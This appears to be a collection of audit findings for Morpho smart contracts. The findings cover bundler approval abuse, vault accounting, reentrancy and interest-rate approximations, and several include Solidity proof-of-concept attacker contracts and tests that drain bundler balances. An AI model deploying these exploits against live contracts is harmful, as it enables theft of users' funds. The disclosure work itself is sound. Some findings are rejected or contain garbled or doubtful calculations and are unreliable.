If removing markets with supply shares is a desirable feature, then the documentation and Natspec should state it explicitly so that users and developers are aware. It would even be better to add a separate function e.g removeBadMarket that can remove a stuck market with supply shares. Although this makes the logic more complex, it addresses the issues mentioned here.

If it isn't a desired feature, this should be fixed by ensuring markets with non-zero supply shares cannot be removed.




### Functions that call _approveMaxTo can be abused to steal token balances of bundlers	_(this issue has been rejected)_

**Severity:** High risk

**Context:** [ERC20WrapperBundler.sol#L30-L39](morpho-blue-bundlers/src/ERC20WrapperBundler.sol#L30-L39), [ERC4626Bundler.sol#L28-L44](morpho-blue-bundlers/src/ERC4626Bundler.sol#L28-L44), [ERC4626Bundler.sol#L53-L72](morpho-blue-bundlers/src/ERC4626Bundler.sol#L53-L72), [CompoundV2MigrationBundler.sol#L41-L59](morpho-blue-bundlers/src/migration/CompoundV2MigrationBundler.sol#L41-L59), [CompoundV3MigrationBundler.sol#L28-L41](morpho-blue-bundlers/src/migration/CompoundV3MigrationBundler.sol#L28-L41)

**Summary**:

Malicious users can obtain maximum allowance of any ERC20 asset in most of the bundler contracts existing in the Morpho Bundlers project. This can be accomplished regarding if the bundler has a balance of the asset or not, and the attacker can drain the contract at will as soon as anyone transfers tokens to the contract.


**Description**:

Function `_approveMaxTo` of `BaseBundler` contract is used to give max allowance to a _spender_ over a certain _asset_. This function is called in:
* `erc20WrapperDepositFor` function of `ERC20WrapperBundler` contract
* `erc4626Mint` and `erc4626Deposit` functions of `ERC4626Bundler` contract
* `morphoSupply`, `morphoSupplyCollateral`, `morphoRepay`, `morphoLiquidate` and `morphoFlashLoan` functions of `MorphoBundler` contract
* `aaveV2Repay` function of `AaveV2MigrationBundler` contract
* `aaveV3Repay` function of `AaveV3MigrationBundler` contract
* `aaveV3OptimizerRepay` function of `AaveV3OptimizerMigrationBundler` contract
* `compoundV2Repay` function of `compoundV2Repay` contract
* `compoundV3Repay` function of `CompoundV3MigrationBundler` contract

Of the above functions, all but those from the `MorphoBundler` and the AAVE contracts (these are not vulnerable because they give max allowance to a hardcoded address, i.e: MORPHO in the `MorphoBundler` contract), can be abused by a malicious user to give max allowance of a user-supplied asset held by the bundler to a user-supplied spender.

Also, bundlers that inherit from contract `TransferBundler` will have available function `erc20TransferFrom` with which users are able to transfer tokens to the bundler. So it is possible that these contracts hold balances of certain tokens (aside from the fact that anyone could send mistakenly an amount of any token to any bundler contract).

So bundlers that inherit from `TransferBundler` and any of the contracts above with vulnerable functions will be a possible target for this attack.

All in all, contracts `EthereumBundler`, `GoerliBundler` and all contracts that inherit from `MigrationBundler` are susceptble to this attack.

In the last section of this report I provide a PoC where:
* A user trasfers X USDC to an `EthereumBundler`
* A malicious user crafts a contract used to attack the `erc4626Mint` function of the `EthereumBundler` contract
* After calling `erc4626Mint`, the malicious contract receives a max allowance of the USDC held by the `EthereumBundler` contract
* The attacker calls function `drain` in the malicious contract to transfer to himself the desired amount of USDC from the `EthereumBundler` contract.


**Recommendation**:

I don't see the need to give max allowance in any of the vulnerable functions. Also, allowance could be set back to zero after using the asset.

For instance, if we take function `erc20WrapperDepositFor` of the `ERC20WrapperBundler` contract:
```solidity
function erc20WrapperDepositFor(address wrapper, uint256 amount) external protected {
	ERC20 underlying = ERC20(address(ERC20Wrapper(wrapper).underlying()));

	amount = Math.min(amount, underlying.balanceOf(address(this)));

	require(amount != 0, ErrorsLib.ZERO_AMOUNT);

	_approveMaxTo(address(underlying), wrapper);
	ERC20Wrapper(wrapper).depositFor(initiator(), amount);
}
```

Adding the following line to the end of the body of the function:
```solidity
underlying.safeApprove(wrapper, 0);
```

Could solve the issue. The solution for the rest of functions would be analogous.

**PoC**

Of all the vulnerable functions mentioned in the first section, I provide here a PoC where I show how an attacker can use function `erc4626Mint` of the `ERC4626Bundler` contract (which is inherited by the `EthereumBundler` contract) to obtain max allowance of an arbitrary asset held by the bundler.

The following test (which you can add to the `test/forge/ethereum` folder of the project and try it) shows how a malicious user could create an `Attacker` contract and use it as `vault` in a call to `erc4626Mint`. This way the `Attacker` contract can get max allowance of any arbitrary asset (in the case below, USDC) held by the bundler contract, and drain any amount sent to the bundler.

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {IAllowanceTransfer} from "../../../lib/permit2/src/interfaces/IAllowanceTransfer.sol";

import "../../../src/ethereum/EthereumBundler.sol";

import "./helpers/EthereumTest.sol";

contract NeumoEthereumBundlerEthereumTest is EthereumTest {
    using MathLib for uint256;
    using MorphoLib for IMorpho;
    using MorphoBalancesLib for IMorpho;
    using MarketParamsLib for MarketParams;
    using SafeTransferLib for ERC20;

    address alice;
    address maliciousBob;
    EthereumBundler neumoBundler;
    bytes[] neumoBundle;

    function setUp() public override {
        super.setUp();

        alice = makeAddr("alice");
        maliciousBob = makeAddr("bobBaddy");

        neumoBundler = new EthereumBundler(address(morpho));

        vm.prank(USER);
        morpho.setAuthorization(address(bundler), true);
    }

    function testDrain()
        public
    {
        ERC20 asset = ERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48); // USDC
        uint amount = 1_000 ether;

        deal(address(asset), alice, amount);

        // We assert Alice's USDC balance is = amount
        assertEq(asset.balanceOf(alice), amount);

        // Alice calls erc20TransferFrom to transfer amount USDC to the bundler contract
        vm.startPrank(alice);
        asset.approve(address(neumoBundler), amount);
        neumoBundle.push(abi.encodeWithSignature("erc20TransferFrom(address,uint256)", address(asset), amount));
        neumoBundler.multicall(neumoBundle);
        vm.stopPrank();

        // We assert the bundler's USDC balance is = amount
        assertEq(asset.balanceOf(address(neumoBundler)), amount);

        // We (in fact Bob would) create an attacker contract (see below)
        // used as a fake vault in the call to erc4626Mint
        Attacker vault = new Attacker(address(neumoBundler), address(asset));
        uint256 shares = amount;
        uint256 maxAssets = type(uint256).max;
        address receiver = maliciousBob;

        // Malicious Bob calls erc4626Mint with the fake vault to give it type(uint256).max allowance 
        // over the bundler's USDC balance
        vm.startPrank(maliciousBob);
        asset.approve(address(neumoBundler), amount);
        neumoBundle.pop();
        neumoBundle.push(abi.encodeWithSignature("erc4626Mint(address,uint256,uint256,address)", address(vault), shares, maxAssets, receiver));
        neumoBundler.multicall(neumoBundle);
        vm.stopPrank();

        // We assert vault's USDC allowance over the bundler's balance is = type(uint256).max
        assertEq(asset.allowance(address(neumoBundler), address(vault)), type(uint256).max);

        // Malicious Bob calls function drain of the fake vault to take amout USDC out and send them to him
        vault.drain(maliciousBob, amount);

        // We assert Bob's USDC balance is = amount
        assertEq(asset.balanceOf(maliciousBob), amount);
    }
}

contract Attacker {
    EthereumBundler public bundler;
    ERC20 myAsset;

    constructor(address _bundler, address _myAsset){
        bundler = EthereumBundler(payable(_bundler));
        myAsset = ERC20(_myAsset);
    }

    function maxMint(address) external pure returns(uint256){
        return type(uint256).max;
    }
    
    function mint(uint256, address) external returns(uint256){
    }
    
    function asset() external returns(address){
        return address(myAsset);
    }
    
    function drain(address to, uint256 amount) external{
        myAsset.transferFrom(address(bundler), to, amount);
    }
}

```



### MAX_RATE_AT_TARGET is too large to be used for the right interest approximations on Morpho Blue	_(this issue has been rejected)_

**Severity:** High risk

**Context:** _(No context files were provided by the reviewer)_

Description: [Morpho Blue](https://github.com/morpho-org/morpho-blue/blob/main/src/Morpho.sol) gets its interest rate from the Interest Rate Model (Irm) contract. It uses this to calculate the interest amount borrowers need to pay. The interest calculation is done using the Taylor's series approximation of $e^{nx} -1$. Where `x` refers to the borrow rate and `n` refers to the time elapsed. 

```
  uint256 borrowRate = IIrm(marketParams.irm).borrowRate(marketParams, market[id]);
  uint256 interest = market[id].totalBorrowAssets.wMulDown(borrowRate.wTaylorCompounded(elapsed));
```

The wTaylorCompounded function does the approximation.

```
    function wTaylorCompounded(uint256 x, uint256 n) internal pure returns (uint256) {
        uint256 firstTerm = x * n;
        uint256 secondTerm = mulDivDown(firstTerm, firstTerm, 2 * WAD); 
        uint256 thirdTerm = mulDivDown(secondTerm, firstTerm, 3 * WAD);
        return firstTerm + secondTerm + thirdTerm;
    }
```

The issue is this approximation does not return a value close to the actual value when nx is very large. The following text proves this.

The Taylor series approximation implemented above is a Maclaurin series which sets the value of a in the Taylor's series expression below to zero.

Taylors series: $f(x) = \sum_{n=0}^{\infty}  \frac{f^n (a)}{n!} {(x-a)}^n$

Maclaurin series: $f(x) = \sum_{n=0}^{\infty}  \frac{f^n (0)}{n!} {(x)}^n$


The approximation only works for values close to zero. This means that as the values shifts away from zero the approximation is less accurate. Let's compare them below. 

**Note**: The approximation implemented in `wTaylorCompounded` is equivalent to: $x + {x^2}/2 + {x^3}/3$. So the comparison will be done with this. *e_a* will represent it below.

$e^{0.01} - 1 = 0.010050167084168, \quad e_a^{0.01} = 0.01005033333$

$e^{0.1} - 1 = 0.105170918075648, \quad e_a^{0.1} = 0.10533333333$

$e^{1} - 1 = 1.718281828459045, \quad e_a^{1} = 1.83333333$

$e^{10} - 1 = 22025.467, \quad e_a^{10} = 393.3333333333$

As can be observed above the approximation becomes less accurate as x shifts from zero. 

From the implementation, x = nx hence, if nx becomes too large the approximation becomes less accurate. i.e if borrowRate * timeElapsed becomes too large the approximation is inaccurate.


The current [max borrow rate at target](https://github.com/morpho-org/morpho-blue-irm/blob/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/adaptive-curve/ConstantsLib.sol#L9) is 317097919837645865 (int256(0.01e9 ether) / 365 days). If 30 seconds elapse and the Irm called returns its max value then,

$nx = 317097919837645865 * 30 = 9.5129375 * 10^{18}$

The value has been scaled by WAD. So,

nx = 38051750380517503800/WAD = 9.5129375

If we compare the two approximations,

$e^{nx} = 13533.6924 \quad e_a^{nx} = 341.7217943026 $

This shows that for the current max value the Taylors series approximation would be very far away from the actual result.

**Recommendations:** Pick a suitable maximum value that still stays within the range the Taylors series can approximate better. The maximum value should stay within the range for very long periods of elapsed time.



### test5678

**Severity:** High risk

**Context:** _(No context files were provided by the reviewer)_

test



### attacker can reallocate Metamorpho permissionless	_(duplicate of [MetaMorpho vaults supply and withdraw queues can be manipulated])_

**Severity:** High risk

**Context:** [MetaMorpho.sol#L823-L823](metamorpho/src/MetaMorpho.sol#L823-L823)

attacker can bypass supply and withdraw queue and practically perform reallocate permission-less for MetaMorpho.

To perform the attack, attacker can use multiple tools like: gas amount when calling supply, flashloan from Morpho markets and Loan and supply to morpho markets.
attacker will use these tools before his interaction with Metamopho contract will set morpho market available liquidity to specific amount that will help accomplish his actions.
These tools will give attacker ability to control how much MetaMorpho is going to withdraw from each market.


let's give a simple example:
1. suppose MetaMorpho has `N` market(`M1, M2, .... Mn`) and admins set supply queue based on markets risks, from low to high risk. suppose the Cap for market `i` is `Ci`.
2. admins set withdraw queue as reverse of the supply queue.
3. now attacker wants to reallocates Metamorpho supplies in `M1`, to `Mn` market. suppose this will require `X` amount from `M1` to `Mn`. attacker will write a contract that performs this:
4. first attacker's contract would get a big flash loan(`A` amount) and supplies into Metamorpho that all the `N` markets reaches their cap. 
5. then attacker's contract would get loan for `N` market so their available liquidity will be zero, except for `M1` market that attacker will leave `X` amount of liquidity available(attacker's contract will supply liquidity to `M1` if it has lower liqudiity).
6. attacker's contract will call `withdraw(X)` and code would try to withdraw from morpho markets fron `Mn` to `M1`, but because all the markets have 0 available liquidity, so MetaMorpho will withdraw `X` funds from `M1.
7. attacker's contract will pay his debt to all `M1` to `Mn` markets that it loaned in step 5 except for `Mn` market. and `Mn` market will sill have no available liquidity.
8. attacker's contract will call `withdraw(A-X)` to withdraw his remaining Metamorpho balance.
9. code would withdraw `A-X` amount from markets `M(n-1)` to `M2` because they have available liquidity.
10. in the end attacker was able to move `X` amount of asset from market `M1` to `Mn` despite the supply and withdraw queue.
11. attacker can perform this attack in more general way to practically reallocate the Metamorpho assets any way he wants and put users funds at risk. for example attacker can reallocate all the funds in markets that have bad debt.

because of the permissionless nature of the attack and because it's repeatable, I believe this would give anyone access to interfere with Metamopho admins and undermine their risk management which was the whole purpose of the Metamorpho.

to prevent this attack, metamorpho and morpho blue shouldn't allow actions and reverse action in the same block/tx.




### totalAssets() ommits markets removed from the withdrawalQueue at MetaMorpho.sol	_(this issue has been rejected)_

**Severity:** High risk

**Context:** _(No context files were provided by the reviewer)_

- Description
deposit, mint, withdraw and redeem call the accrueFee internal function that serves as a mechanism to accrue all fees generated since the last call and sum it with the previously existing total amount of assets, to return the latest amount of assets held by the calling MetaMorpho contract.
Inside the aforementioned internal function, accruedFeeShares is executed and the newTotalAssets variable is defined by the result of a totalAssets() call.

The issue with that is markets with supply different than zero can be removed provided their removal passes through the following flow:
submitMarketRemoval -> await timelock -> execute withdrawQueue update

The removal of such markets make totalAssets return values smaller than the actual total asset held by the pool, as totalAssets do not account for the supplied tokens to the markets:
```solidity
function totalAssets() public view override returns (uint256 assets) {
        for (uint256 i; i < withdrawQueue.length; ++i) {
            assets += MORPHO.expectedSupplyAssets(_marketParams(withdrawQueue[i]), address(this));
        }
    }
```
As consequence, the totalAssets amount accounted for is smaller, but the total supply and shares emmited by metamorpho is kept, so minting/deposit will inflate a new depositor supply and deflate a previous user's contribution.
- Proof of concept
Paste the following code snippet at the file MarketTest2.sol inside the test/forge folder:
```solidity
// SPDX-License-Identifier: GPL-2.0-or-later

pragma solidity ^0.8.0;

import {stdError} from "../../lib/forge-std/src/StdError.sol";
import {SafeCast} from "../../lib/openzeppelin-contracts/contracts/utils/math/SafeCast.sol";
import "./helpers/IntegrationTest.sol";
import "../../src/interfaces/IMorphoMarketParams.sol";
import {console} from "../../lib/forge-std/src/console.sol";

  
contract MarketTest2 is IntegrationTest {
    using MarketParamsLib for MarketParams;
    using MorphoLib for IMorpho;

    address private ALICE;
    address private BOB;

    function setUp() public override {
        super.setUp();
        // Assign addresses for Alice and Bob
        ALICE = address(1);
        BOB = address(2);

        // Set up initial balances for Alice and Bob
        loanToken.setBalance(ALICE, 1 ether);
        loanToken.setBalance(BOB, 1 ether);

        // Set caps for markets as needed

        _setCap(allMarkets[0], CAP);
        _setCap(allMarkets[1], CAP);
        _setCap(allMarkets[2], CAP);

    }

    function testSubmitMarketRemovalImpactsTotalShares() public {

        // Alice deposits 1 ETH
        loanToken.setBalance(ALICE, 1 ether);
        vm.prank(ALICE);
        loanToken.approve(address(vault), 1 ether);
        vm.prank(ALICE);
        vault.deposit(1 ether, ALICE);
        _setCap(idleParams, 0);

        // Market is removed
        vm.expectEmit();
        emit EventsLib.SubmitMarketRemoval(CURATOR, idleParams.id());
        vm.prank(CURATOR);
		vault.submitMarketRemoval(idleParams.id());
        // Wait for market removal timelock then update withdraw queue
        vm.warp(block.timestamp + TIMELOCK + 1);

    // Convert Id array to uint256 array for the updated withdraw queue
    uint256[] memory updatedWithdrawQueue = new uint256[](3);
    updatedWithdrawQueue[0] = uint256(3); // Convert to uint256
    updatedWithdrawQueue[1] = uint256(1); // Convert to uint256
    updatedWithdrawQueue[2] = uint256(2); // Convert to uint256

    vm.prank(ALLOCATOR);

 vault.updateWithdrawQueue(updatedWithdrawQueue);
        assertEq(vault.totalSupply(), 1000000000000000000000000);
        assertEq(vault.totalAssets(), 0);
        
        // Bob deposits 1 ETH
        loanToken.setBalance(BOB, 1 ether);
        vm.prank(BOB);
        loanToken.approve(address(vault), 1 ether);
        vm.prank(BOB);
        vault.deposit(1 ether, BOB);

        assertEq(vault.totalAssets(), 1 ether);
        assertEq(vault.totalSupply(), 1000000000000000002000000000000000000000000);
         }

}
```

Notice how the assets supplied by Alice stop being accounted for, at some point making the MetaMorpho actually accounts for zero supplied tokens.
The side effect is that totalSupply becomes affected as when markets are removed when they still have some supplied tokens, deposits become inflated.

Run the test with the following command:
```
forge test --match-contract MarketTest2 -vvv
```
- Recommendation
There are a couple of options to tackle this issue.
1. Don't allow markets to be removed from the withdrawQueue if their expectedSupplyAssets is != 0.
2. Account totalAssets from all previously supplied markets, not from the withdrawQueue.



### [H] First depositor can steal shares from second depositor	_(duplicate of [First depositor can steal funds of others])_

**Severity:** High risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:

https://github.com/morpho-org/metamorpho/blob/a4a6c3dda06379dc3e02fbb053f6761f1e90ea1c/src/MetaMorpho.sol#L673

In metaMorpho, it allows users to deposit into a newly created vault via the deposit function below.

```
  function deposit(uint256 assets, address receiver) public override returns (uint256 shares) {
        uint256 newTotalAssets = _accrueFee();

        // Update `lastTotalAssets` to avoid an inconsistent state in a re-entrant context.
        // It is updated again in `_deposit`.
        lastTotalAssets = newTotalAssets;

        shares = _convertToSharesWithTotals(assets, totalSupply(), newTotalAssets, Math.Rounding.Floor);

        _deposit(_msgSender(), receiver, assets, shares);
    }
```

It then calculates the amount of shares to mint.

```
    function _convertToSharesWithTotals(
        uint256 assets,
        uint256 newTotalSupply,
        uint256 newTotalAssets,
        Math.Rounding rounding
    ) internal pure returns (uint256) { // decimal offset is 6
        return assets.mulDiv(newTotalSupply + 10 ** _decimalsOffset(), newTotalAssets + 1, rounding);
    }

```

The formula here is 

shares = deposit amount×(existing shares+10 **6)/(existing assets+1)

Due to the above calculation, this allows the first depositor to allocate themselves more shares than the second depositor.

**Proof Of Concept:**

**Initial State of the Vault:**

Vault Total Assets: 0 DAI
Vault Total Supply: 0 Shares

**Attacker's First Deposit:**

Attacker Deposits 2 DAI 
Calculation of Attacker's Shares 
(using the formula shares = deposit amount × (existing shares + 10^6) / (existing assets + 1)): 

shares=2 DAI×(0 Shares+106) , (0 DAI+1)    shares=2DAI×(0DAI+1)  ,  (0Shares+106) 

**shares=2,000,000**

**Updated Vault State After First Deposit:**

Total Assets: 2 DAI
Total Supply: 2,000,000 Shares


**Attacker's Second Deposit:**

Attacker Deposits: 1000 DAI
Calculation of Attacker's Additional Shares: 

shares=1000 DAI×(2,000,000 Shares+106)(2 DAI+1)     shares=1000DAI×(2DAI+1)   ,( 
  2,000,000Shares+106) 

**shares=499,999,500**

**Updated Vault State After Second Deposit:**

Total Assets: 1002 DAI
Total Supply: ~2,499,999,500 Shares

**Second Depositor's Deposit:**

Second Depositor Deposits: 1000 DAI
Calculation of Second Depositor's Shares: 

shares=1000 DAI×(2,499,999,500 Shares+106)(1002 DAI+1)
shares=1000DAI×(1002DAI+1)    ,     (2,499,999,500Shares+106) 

**shares=2,495,012,488**


**Final Vault State:**

Total Assets: 2002 DAI
Total Supply: ~4,995,011,988 Shares


**Analysis of the Outcome**

In this scenario with a higher initial deposit, the attacker gains a significant advantage in terms of share allocation

The attacker's total share count is ~2.5 billion for a deposit of 1002 DAI.
The second depositor, despite depositing a similar amount (1000 DAI), receives a lower share count of ~2.495 billion.



**Recommendation**:
Consider requiring a minimal amount of share tokens to be minted for the first minter, 
and send a part of the initial mint as a 
permanent reserve so that the price per share can be more resistant to manipulation. 
OpenZeppelin calls this "virtual shares" on their attack mitigation:

Use the virtual shares and assets suggested by the OZ team here 
https://github.com/OpenZeppelin/openzeppelin-contracts/pull/3979



### attacker approval of Bundler balance for his contract and steal user balances in Bundler address during user Bundler tx	_(duplicate of [Functions that call _approveMaxTo can be abused to steal token balances of bundlers])_

**Severity:** High risk

**Context:** [ERC20WrapperBundler.sol#L37-L37](morpho-blue-bundlers/src/ERC20WrapperBundler.sol#L37-L37)

Attacker can make Bundler contract to give unlimited approval for his controlled addresses, then when another users use the Bundler and execution reaches the attacker controlled address, attacker can withdraw user funds that exists in Bundler.

This is the POC:
1. attacker would create a malicious contract named `MALC1` that implements wrap interface but returns target ERC20s for `underlying()` reponose.
2. attacker would call Bundler and execute `erc20WrapperDepositFor(MALC1, ...)` and code would call `_approveMaxTo(address(underlying), MALC1)`
3. as MALC1 controls the `underlying` value, so it can make Bundler to give approval for different tokens like WETH, USDC, USDT,....
4. when user interact with Bundler, in some steps user's tokens transferred into Bundler to get deposited in to the target systems.
5. suppose users USDC get transferred into the Bundler and Bundler make some external call(user specified them) and execution would reach MALC1
6. now MLAC1 can transfer USDC balance of Bundler which belonged to user1.


there is two condition for this attack:
1. in user transactions in Bundler, when different tasks is getting done, the transaction most reach MALC1 contract.
2. the loss of Bundler amount shouldn't cause revert in rest of Bundler tasks.

I believe both of these two conditions are probable enough. for condition 2, because there are a lot of actions that the absolute amount isn't get specified by user and only works with remaining contract balance, so if contract balance decrease, those actions will not revert.
for condition 1, there was similar High severity report in past audits that said malicious address can reenter the Bundler. this is the same attack vector but instead of reentering malicious contract can just transfer Bundler ERC20 balance like WETH, USDC, USDT. because user doing different actions with different systems so any of those external systems can perform this attack(or any external call in those external systems and so on....).


because of all the above fact I believe this is high severity that allows attacker to steal users funds if they use Bundler.

to fix this issue it's better to set approval to 0 after each function.



### the value for MAX_RATE_AT_TARGET  is wron and max APR doesn't get enforced which can result in loss for markets	_(duplicate of [`MAX_RATE_AT_TARGET` is given as APR but Morpho Blue uses it as APY])_

**Severity:** High risk

**Context:** [ConstantsLib.sol#L9-L9](morpho-blue-irm/src/libraries/adaptive-curve/ConstantsLib.sol#L9-L9)

the convert from yearly % to seconds % is wrong so the max limit is not gonna be applied correctly. when code use division it doesn't consider the compounding of the rate over the year. to correctly calculate the seconds base interests rate code should use power of `1/365` like:
```
MAX_RATE_AT_TARGET  = (0.01e9 ether) ^ (1/ seconds in one year) = (0.01e9 ether) ^ (1/ (365 * 24 * 60 * 60))
```


the current value for `MAX_RATE_AT_TARGET ` is about `0.3` which implies `2^(11M)` APY. so it's like there is no maximum APR implemented. as this can result in DOS for markets who uses IRM I believe this is critical.




### attacker can mint more shares reentrancy if one of the underlying markets have IRM with external call	_(this issue has been rejected)_

**Severity:** High risk

**Context:** [MetaMorpho.sol#L797-L797](metamorpho/src/MetaMorpho.sol#L797-L797)

if one of the underlying markets in the supply queue or withdraw queue had a IRM that makes external call, then it would be possible for attacker to reenter Metamorpho during deposit/mint or withdraw/redem while state is wrong and mint more shares.

this attack is also possible during reallocate too.

I know it's mentioned in the Morphoblu that IRM should not have external call, but in the Metamorpho this risk is not mentioned and also Metamorpho can have list of markets so the chance for one of those IRMs to have external call is bigger and attacker can use it to attack Metamorpho.

POC for `deposit()`:
in `Deposit()` function, code first mint shares for user and transfer user asserts to Metamorpho contract, then code loops through supply market list and tries supply the assets in the markets. in the middle of this loop, asset per share has lower value than it should be (because total supply is increased but total assets is not yet correct value, because some assets are still in the MetaMorpho balance and they are not considered as totalAssets) so if one of those markets make an external call, attacker can reenter and call mint again and use the wrong asset/share ratio to mint more shares.


POC for `withdraw()`:
this is same as the deposit, during the withdraw from markets, totalAssets of the MetaMorpho is decreased but total supply of shares is not yet decreased, so `totalAsset()/totalSupply()` will be wrong, if one of the underlying market's IRM makes an external call then attacker can reenter the Metamorpho during the `Morpho.withdraw()` call and attacker can call `MetaMorpho.deposit()` to get more share(because of wrong asset to share ratio).


overall this risk should be mentioned for users and managers of Metamorpho to not use any market that it's IRM has external call.



### Call recipient can use open approvals to drain the bundler	_(duplicate of [Functions that call _approveMaxTo can be abused to steal token balances of bundlers])_

**Severity:** High risk

**Context:** [BaseBundler.sol#L51-L51](morpho-blue-bundlers/src/BaseBundler.sol#L51-L51)

- Bug Description

The Morpho periphery includes bundlers designed to consolidate multiple interactions into a multicall, allowing users to transfer funds to the bundler contract for subsequent distribution through distinct calls.

This functionality, involving external address calls, introduces a potential reentrancy vulnerability. Although previously identified and addressed in the Cantina and OpenZeppelin audits, the fixes implemented by the protocol team primarily safeguard against reentrancy by other callers, limiting access to the original initiator. However, these measures do not fully protect against scenarios where an attacker exploits the intermediate state of the bundler after an external call without reentering.

A combination of various vulnerabilities creates a potential avenue for malicious users to misappropriate funds. Understanding the attack path begins with examining how the contract manages external allowances. In the current implementation, specific functions, such as `erc20WrapperDepositFor()`, `erc4626Mint()`, `erc4626Deposit()`, `morphoSupply()`, and others—grant an allowance of `type(uint256).max` for a user-provided token to (potentially user provided) external addresses. This allowance is established through the `_approveMaxTo()` function, as shown below:

```solidity
function _approveMaxTo(address asset, address spender) internal {
	if (ERC20(asset).allowance(address(this), spender) == 0) {
		ERC20(asset).safeApprove(spender, type(uint256).max);
	}
}
```

This results in an unlimited allowance to a user-specified address, a potential vulnerability when combined with other functionalities. While maintaining open approvals alone is suboptimal but not necessarily a vulnerability, when combined with other functions, it enables malicious users to drain funds.

The initial step for an attacker involves deploying a malicious `ERC4626` vault, to which they grant the maximum allowance using the aforementioned functionality.  The attacker can achieve this by using the `ERC4626` functionality to deposit 1 token into his own vault. This vault must include a function that allows the attacker to transfer out the token balance of the bundler to himself, using the infinite allowance.

At this part if an attacker has control of the control flow he can drain funds from the contract, which are intended to be used in later calls. These calls can be from different call groups, which will be explained below:

**Transfer:**

The final piece of this attack path involves the implementation of transfer functions `nativeTransfer()`, `erc20Transfer()`, and `erc20TransferFrom()`. These functions accept an amount for transfer but can also receive `type(uint256).max` to transfer the remaining bundler balance. Importantly, these functions set the actual transfer amount to the minimum of the provided amount and the current bundler balance. Consequently, if funds are drained before such a transfer, the transfer does not revert but effectively transfers 0. If the token reverts on a 0 transfer, the attacker can leave 1 wei/token in the bundler, ensuring the call passes without reverting.

**Migration, ERC4626, StETH, ERC20Wrapper:**

Similarly, funds supplied for calls to 

<details>
- `erc20WrapperDepositFor`
- `erc4626Deposit`
- `stakeEth`
- `wrapStEth`
- `unwrapStEth`
- `wrapNative`
- `unwrapNative`
- `aaveV2Repay` 
- `aaveV3Repay`
- `aaveV3OptimizerRepay`
- `compoundV2Repay`
- `compoundV3Repay
</details>

 can be taken, as long as the attacker leaves at least 1 token inside the bundler. This vulnerability arises because these calls use the minimum of the asset parameter and the actual balance of the bundler as the amount to transfer. An example from `wrapNative()` can be seen below:

```solidity
amount = Math.min(amount, address(this).balance);
require(amount != 0, ErrorsLib.ZERO_AMOUNT);
```

**Morpho:**

Moreover, if a user utilizes the functions `morphoSupply()` or `morphoSupplyCollateral()` after the exploited call, sets the assets parameter to `type(uint256).max`, and configures a high or no slippage, the funds designated for these calls can also be taken. This occurs due to the logic of these calls employing `token.balanceOf(Bundler)` when `type(uint256).max` is passed as assets.

```solidity
// Don't always cap the assets to the bundler's balance because the liquidity can be transferred later
// (via the `onMorphoSupply` callback).
if (assets == type(uint256).max) assets = ERC20(marketParams.loanToken).balanceOf(address(this));
```

As long as the attacker strategically leaves one token inside the contract,
the calls proceed without failure, enabling the attacker to take the remaining tokens.

- Impact

Exploiting this vulnerability empowers an attacker to seize control of the execution flow through two potential scenarios: convincing the victim to transfer funds through the bundler (granting control in the attacker's `receive()` function), or invoking the attacker's malicious `ERC4626`. By combining these exploits with the infinite allowances granted and the specific implementation of transfer functions, a viable attack path emerges, allowing an attacker to steal funds from other users.

- Proof of Concept

For the proof of concept, two methods of exploiting this vulnerability to steal other users' funds will be explained.
- User directly deposits into a malicious Vault

In this scenario, a user is deceived into depositing funds into a malicious vault before transferring additional funds. The attack path unfolds as follows:

1. The attacker deploys a malicious ERC4626 vault.
2. The user generates multicalls.
3. The attacker exploits the call to their vault to transfer all remaining funds from the bundler.
4. The user's transfers still pass, and execution concludes.

To demonstrate this, a simple malicious ERC4626 vault has been developed:

<details>

```solidity
pragma solidity ^0.8.0;

interface IERC20 {
	function totalSupply() external view returns (uint256);
	function balanceOf(address account) external view returns (uint256);
	function transfer(address to, uint256 value) external returns (bool);
	function allowance(address owner, address spender) external view returns (uint256);
	function approve(address spender, uint256 value) external returns (bool);
	function transferFrom(address from, address to, uint256 value) external returns (bool);
}

contract MaliciousERC4626V1 {
	mapping(address => uint256) private _balances;
	address public owner;
	address public asset;
	address public bundler;

	constructor(address _asset, address _bundler) {
		owner = msg.sender;
		asset = _asset;
		bundler = _bundler;
	}

	function deposit(uint256 amount, address account) external returns (uint256) {
		//This function can be abused in the case of a direct call
		
		//Steal all the remaining funds that are still in the bundler
		IERC20(asset).transferFrom(msg.sender, owner, IERC20(asset).balanceOf(msg.sender));
		
		return 0;
	}

	function maxDeposit(address account) external view returns (uint256) {
		return type(uint256).max;
	}

	function balanceOf(address account) external view returns (uint256) {
		return _balances[account];
	}

	//All other ERC4626 functionalities are removed for simplicity but would be present in a real malicious vault
}
```

</details>

In the following testcase, the described vulnerability is exploited:

<details>

```solidity
function testDrainByApprovalSimple() public
{
    //------------------SETUP-----------------------//
    address user = vm.addr(456);
    address user2 = vm.addr(156);
    address attacker = vm.addr(789);
    MarketParams memory marketParams = _randomMarketParams(123);

    deal(marketParams.loanToken, user, 100);

    assertEq(ERC20(marketParams.loanToken).balanceOf(user), 100, "user.balanceOf(loanToken)");
    assertEq(ERC20(marketParams.loanToken).balanceOf(attacker), 0, "attacker.balanceOf(loanToken)");

    //Attacker deploy his malicious Vault
    vm.prank(attacker);
    MaliciousERC4626V1 attackerVault = new MaliciousERC4626V1(marketParams.loanToken, address(bundler));

    //------------------TEST-----------------------//
    vm.startPrank(user);
    ERC20(marketParams.loanToken).transfer(address(bundler), 100);

    //User wants to deposit 50 tokens into the vault and then transfer the rest to his friend
    bundle.push(_erc4626Deposit(address(attackerVault), 50, 0, user));

    //User uses type(uint256).max as according to the documentation it will transfer the rest left in the bundler
    bundle.push(_erc20Transfer(marketParams.loanToken, user2, 50));

    //Now he run the calls
    bundler.multicall(bundle);

    //attacker has now gotten all the tokens
    assertEq(ERC20(marketParams.loanToken).balanceOf(attacker), 100, "attacker.balanceOf(loanToken)");

    //user2 didn't get any tokens
    assertEq(ERC20(marketParams.loanToken).balanceOf(user2), 0, "user2.balanceOf(loanToken)");

    vm.stopPrank();
}
```

</details>

The testcase can be executed by adding it to the `EthereumBundlerEthereumTest.col`file, adding the import for the vault `import {MaliciousERC4626V1} from "./helpers/MaliciousERC4626V1.sol";` and running it using `forge test -vvvv --match-test "testDrainByApprovalSimple"`.

This scenario leads to a attacker being able to steal more funds from the user than the user was duped into depositing into the malicious vault.

- Attacker using his receive function to drain the vault

